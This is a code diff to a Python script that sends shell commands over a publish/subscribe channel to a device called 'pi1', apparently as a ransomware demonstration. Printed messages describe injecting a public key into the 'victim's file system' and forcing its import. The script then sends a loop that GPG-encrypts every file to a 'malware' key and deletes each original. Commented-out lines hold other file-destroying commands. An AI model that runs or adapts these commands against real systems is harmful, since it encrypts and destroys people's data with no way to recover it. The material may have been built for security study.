@@ -86,6 +86,8 @@ class pubOnly():
 
         primo = 1
 
+        print("injecting public key to victim's file system...")
+
         for row in filepointer:
             #print(row, end = '')
             row = row.strip('\n')
@@ -98,12 +100,20 @@ class pubOnly():
                 self.client.myPublish(topic, message)
             sleep(0.5)
 
+        print("... operation completed successfully.")
+
         sleep(5)
 
         # sleep(5)
 
+        print("Forcing victim to import the public key...")
+
         message = {"src" : clientname, "dest" : "pi1", "command" : "gpg --import public.key"}
         self.client.myPublish(topic, message)        
+
+        sleep(1)
+
+        print("... operation completed successfully.")
 
         sleep(5)
 
@@ -115,10 +125,10 @@ class pubOnly():
 
         # sleep(5)
 
-        message = {"src" : clientname, "dest" : "pi1", "command" : "cd ./A"}
-        self.client.myPublish(topic, message)
+        # message = {"src" : clientname, "dest" : "pi1", "command" : "cd ./A"}
+        # self.client.myPublish(topic, message)
 
-        sleep(5)
+        # sleep(5)
 
         ##### message = {"src" : clientname, "dest" : "pi0", "command" : "find . -maxdepth 1 -type f -exec -c 'gpg --always-trust -e -r \"malware\" {}\n rm -f {} \;'"}
         ##### self.client.myPublish(topic, message)           
@@ -135,8 +145,12 @@ class pubOnly():
         # message = {"src" : clientname, "dest" : "pi0", "command" : "for i in $(find . -type f -print); do echo ciao > $i;  done"}
         # self.client.myPublish(topic, message) 
 
+        print("Performing encryption on victim's file system...")
+
         message = {"src" : clientname, "dest" : "pi1", "command" : "for i in $(find . -type f -print); do gpg --always-trust -e -r \"malware\" $i; rm -f $i; sleep 1; done"}
         self.client.myPublish(topic, message) 
+
+        print("... encryption command sent. Now victim will operate by itself.")
 
         sleep(5)
 
